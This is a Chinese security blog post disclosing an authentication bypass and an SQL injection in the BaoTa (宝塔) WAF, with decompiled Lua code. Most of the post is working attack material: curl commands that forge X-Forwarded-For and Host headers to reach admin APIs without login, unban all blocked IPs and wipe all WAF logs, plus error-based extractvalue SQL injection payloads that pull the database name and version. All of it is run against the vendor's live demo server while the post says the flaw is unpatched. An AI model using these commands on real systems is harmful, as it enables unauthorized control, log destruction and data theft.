#  【漏洞速递】宝塔最新未授权访问漏洞及sql注入   
Palvef  WIN哥学安全   2024-02-17 16:08  
  
## 免责声明：  
  
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
## 宝塔最新未授权访问漏洞及sql注入  
### 未授权访问  
  
整个宝塔 WAF 核心防护功能的代码写的确实有点粗糙，代码组织方式不像一个成熟软件该有的架构，小 Bug 一眼望不到头，今天分享的是一个未授权访问漏洞，普通用户可以无视宝塔的随机登录地址，无视宝塔的登录密码，直接操作后台的数据，实现人人都是管理员的效果。  
```
start = function ()
 ... 此处身略若干行
 if ngx.var.remote_addr == "127.0.0.1" and ngx.ctx.Server_name == "127.0.0.251" and ngx.var.host == "127.0.0.251" then
  if ngx.var.uri == "/get_btwaf_drop_ip" then
   Public.return_message(200, uv0.get_btwaf_drop_ip())
  elseif ngx.var.uri == "/remove_btwaf_drop_ip" then
   Public.return_message(200, uv0.remove_btwaf_drop_ip())
  elseif ngx.var.uri == "/clean_btwaf_drop_ip" then
   Public.return_message(200, uv0.clean_btwaf_drop_ip())
  elseif ngx.var.uri == "/updateinfo" then
   Public.return_message(200, uv0.updateInfo())
  elseif ngx.var.uri == "/get_site_status" then
   Public.return_message(200, uv0.get_site_status())
  elseif ngx.var.uri == "/get_global_status" then
   Public.return_message(200, uv0.get_global_status())
  end

  if ngx.var.uri == "/clean_btwaf_logs" then
   Public.return_message(200, uv0.clean_btwaf_logs())
  end

  if ngx.var.uri == "/clear_speed_hit" then
   Public.return_message(200, uv0.clear_speed_hit())
  end

  if ngx.var.uri == "/clear_replace_hit" then
   Public.return_message(200, uv0.clear_replace_hit())
  end

  if ngx.var.uri == "/reset_customize_cc" then
   Public.return_message(200, uv0.reset_customize_cc())
  end

  if ngx.var.uri == "/clear_speed_countsize" then
   Public.return_message(200, uv0.clear_speed_countsize())
  end
 end
end

```  
  
这段代码位于 /cloud_waf/nginx/conf.d/waf/public/waf_route.lua 文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码。  
  
看代码最开端的 if 语句，只要满足 ip 是 127.0.0.1 ，域名是 127.0.0.251 这两个条件就能在不用登录的情况下访问下面的 API 。  
  
话说这是临时工写的代码吧，对于宝塔的配置来说，要满足这两个条件很难吗？  
  
配置 x-forwarded-for 头为 127.0.0.1 即可满足 ip 是 127.0.0.1 的条件
配置 host 头为 127.0.0.251 即可满足域名是 127.0.0.251 的条件
提供一条 curl 参数供大家参考  
```
curl 'http://宝塔地址/API'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
到此漏洞原理就讲完了  
  
我们访问宝塔官方网站做个测试  
  
**get_btwaf_drop_ip**  
  
这个 API 用来获取已经拉黑的 IP 列表，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/get_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
**remove_btwaf_drop_ip**  
  
这个 API 用来解封 IP ，提供一个 get 参数即可，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/remove_btwaf_drop_ip?ip=1.2.3.4'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"msg":"1.2.3.4 已解封","status":true}

```  
  
**clean_btwaf_drop_ip**  
  
这个 API 用来解封所有 IP ，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/clean_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"msg":"已解封所有 IP","status":true}

```  
  
**updateinfo**  
  
这个 API 看起来是更新配置用的，需要一个 types 参数做校验，但实际并没有什么用处，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/updateinfo?types'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
**get_site_status**  
  
这个 API 用来获取网站的配置，server_name 参数需要提供网站的域名，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"status":true,"msg":{"uv":0,"qps":0,"inland":0,"overseas":0,"today":{"pc_count":0,"mobile_count":0,"req":0,"spider_google":0,"spider_bing":0,"spider_sogou":0,"spider_360":0,"spider_other":0,"err_40x":0,"spider_baidu":0,"recv_bytes":0,"send_bytes":0,"err_500":0,"err_502":0,"err_503":0,"err_504":0,"err_499":0,"uv_count":0,"ip_count":0,"pv_count":0},"send_bytes":0,"proxy_count":0,"err_502":0,"recv_bytes":0,"err_504":0,"err_499":0,"ip":0,"proxy_time":0,"pv":0}}

```  
  
**clean_btwaf_logs**  
  
这个 API 用来删除宝塔的所有日志，使用以下命令发起访问  
```
curl "http://btwaf-demo.bt.cn/clean_btwaf_logs"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
后续还有一些 API 大同小异，不一一列举了  
  
**get_global_status**  
  
**clear_speed_hit**  
  
**clear_replace_hit**  
  
**reset_customize_cc**  
  
**clear_speed_countsize**  
### sql注入  
  
接上篇，在测试宝塔 WAF 的未授权访问漏洞时无意间还发现了一个 SQL 注入漏洞，品相还不错，可执行任意 SQL 语句。  
  
总之，吃了一惊，一个防 SQL 注入的工具居然也有 SQL 注入漏洞。  
  
请看这段代码  
```
get_site_status = function ()
 if not ngx.ctx.get_uri_args.server_name then
  return Public.get_return_state(false, "参数错误")
 end

 ... 此处省略若干代码

 slot7, slot8, slot9, slot10 = slot4.query(slot4, [[
SELECT 
  SUM(request) as req,
  SUM(err_40x) as err_40x,
  SUM(err_500) as err_500,
  SUM(err_502) as err_502,
  SUM(err_503) as err_503,
  SUM(err_504) as err_504,
  SUM(err_499) as err_499,
  SUM(send_bytes) as send_bytes,
  SUM(receive_bytes) as recv_bytes,
  SUM(pc_count) as pc_count,
  SUM(mobile_count) as mobile_count,
  SUM(spider_baidu) as spider_baidu,
  SUM(spider_google) as spider_google,
  SUM(spider_bing) as spider_bing,
  SUM(spider_360) as spider_360,
  SUM(spider_sogou) as spider_sogou,
  SUM(spider_other) as spider_other,
  SUM(ip_count) as ip_count,
  SUM(pv_count) as pv_count,
  SUM(uv_count) as uv_count
   FROM `request_total` WHERE `server_name`=']] .. slot1 .. "' AND `date`='" .. os.date("%Y-%m-%d") .. "'") ... 此处省略若干代码 return Public.get_return_state(true, slot6)end
```  
  
这段代码位于 /cloud_waf/nginx/conf.d/waf/public/waf_route.lua 文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码  
  
这段逻辑就在上文提到的 **get_site_status** API 中，slot1 变量就是 server_name 参数。原理很简单，server_name 参数没有做任何校验就直接带入了 SQL 查询。  
  
宝塔官网还没有修复这个问题，还是拿宝塔官网为例，试试以下命令：  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\btwaf': 1105: HY000."}

```  
  
从响应来看已经注入成功，通过 updatexml 的报错成功的爆出了库名叫 **btwaf**  
  
继续执行以下命令：  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,version()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\8.1.0': 1105: HY000."}

```  
  
从响应来看，mysql 版本是 8.1.0  
  
在继续执行以下命令  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,(select'hello,world')))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\hello,world': 1105: HY000."}

```  
  
看起来 **select 'hello,world'** 也执行成功了，到此为止，基本可以执行任意命令。  
  
漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。  
  
Tips:  
  
  
文章来源：**Palve**  
师傅投稿  
  
往期推荐  
  
[实战 | 记一次有趣的文件上传绕过getshell](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497923&idx=1&sn=a759d4420a96b595dbd2a047e6268f71&chksm=c0c85937f7bfd021c8dd76550839f0070a2d39dfbb09c830f0645caf3a3fc41bb2174e9bd5bb&scene=21#wechat_redirect)  
  
  
[一款国外大牛 40X bypass工具(1.5K+star！)](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497868&idx=1&sn=66bdd60b53f4423d7e3d151097a40ba2&chksm=c0c85978f7bfd06e1da57eef8d6e93ad9f0d2ec92ca714866a46226767d25dbd3d4413a4f603&scene=21#wechat_redirect)  
  
  
[最新免杀34个查杀引擎的Webshell](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497854&idx=1&sn=d3bc98a2a58eda6727648b3f63dc2de2&chksm=c0c8598af7bfd09c444c988f309237f8470364b6138f2e1abc5256236ca62397d98ecbbcdd6b&scene=21#wechat_redirect)  
  
  
[【工具推荐】渗透测试工具箱 -- AutoRedTools](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497838&idx=1&sn=bb215e03914f60ca73e8058e280165d5&chksm=c0c8599af7bfd08c80eb7d5c8280e92662c3290c21eda7109988467e753b2290c47633993061&scene=21#wechat_redirect)  
  
  
[开源漏洞管理平台](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497765&idx=1&sn=a7907193d5a2427a4a937d632c84bfa0&chksm=c0c859d1f7bfd0c7cea77bf469fc94c7e98df864cc3830088bea4009e667a343808c95a75b09&scene=21#wechat_redirect)  
  
  
[常规安全检查阶段 | Windows 应急响应](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247497751&idx=2&sn=4dc34499aca0c5237f9c384d5386f45b&chksm=c0c859e3f7bfd0f53e2893372869d3792e16b305ca32cf25140306fb1355861bcc608462bf96&scene=21#wechat_redirect)  
  
  
[灯塔资产管理系统魔改版搭建(ARL-Puls)](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496861&idx=1&sn=72ef999374fd2754a46e1526899e86b6&chksm=c0c85569f7bfdc7fcf2a815c46ee73c9f031b0a32d7179da28a11d20e3a7b9aff4743be15251&scene=21#wechat_redirect)  
  
  
[记某系统有趣的文件上传](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496821&idx=1&sn=c4d0abef07a6d70c8901d9f405360543&chksm=c0c85581f7bfdc971ab3865c18d6d36dc1e5ba68a1a4662afffd45f67a9f23f1b162c2fce0a9&scene=21#wechat_redirect)  
  
  
[【渗透实战】微信小程序渗透测试](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496721&idx=1&sn=1acb2223b03f5ed44b7d44eaa40ad068&chksm=c0c855e5f7bfdcf37e05059835786b05c44f8357463ae4c941021affcb2b7122b583e4a1ada9&scene=21#wechat_redirect)  
  
  
[记录一次前端RSA加密的逆向](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496721&idx=2&sn=e28fa5f13001e9660f077623811b4b61&chksm=c0c855e5f7bfdcf328180a79242a02e384b9d6443c5c8adb0355801a40ef4a242f146cc7d55f&scene=21#wechat_redirect)  
  
  
[【1day】EduSoho配置文件泄露，获取数据库账号密码](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496680&idx=2&sn=fb1a6b611bd304f74d90b859773b84ed&chksm=c0c8521cf7bfdb0a69065fcf2cebbcc128b498ee6d92acf9cec6c360f15cdfa0f1124f801588&scene=21#wechat_redirect)  
  
  
[【渗透实战】某访客系统越权测试](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496669&idx=1&sn=6e0030795498ab60b32023a25badd5c7&chksm=c0c85229f7bfdb3f3d788770457d4d4e779ddd091ada21104af21d3bea340443b303067efad5&scene=21#wechat_redirect)  
  
  
[【附靶场】某省信息安全管理与评估第二阶段应急响应](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496644&idx=1&sn=bdcd7dbdedbb2a491d0168147e2d9d23&chksm=c0c85230f7bfdb26c7d411f864d7a403b8cefb919f51434aff72aa71b915f2975a949f8b7b90&scene=21#wechat_redirect)  
  
  
[Web安全之逻辑漏洞全方位总结](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496644&idx=2&sn=93a08aa038db3367fab88d38d3a948c7&chksm=c0c85230f7bfdb26d4b0b3ee763e6557213240298adb890ed08b41639c8a4535970c0c998af6&scene=21#wechat_redirect)  
  
  
[记某次应急响应过程的社工溯源](https://mp.weixin.qq.com/s?__biz=MzkwODM3NjIxOQ==&mid=2247496625&idx=1&sn=f9d35155c09aabc6f567fa0eb7931a1b&chksm=c0c85245f7bfdb530d029794a83e945c8ec8d704f3eff4f84388de2371aebcc8f219069073ea&scene=21#wechat_redirect)  
  
  
  
  
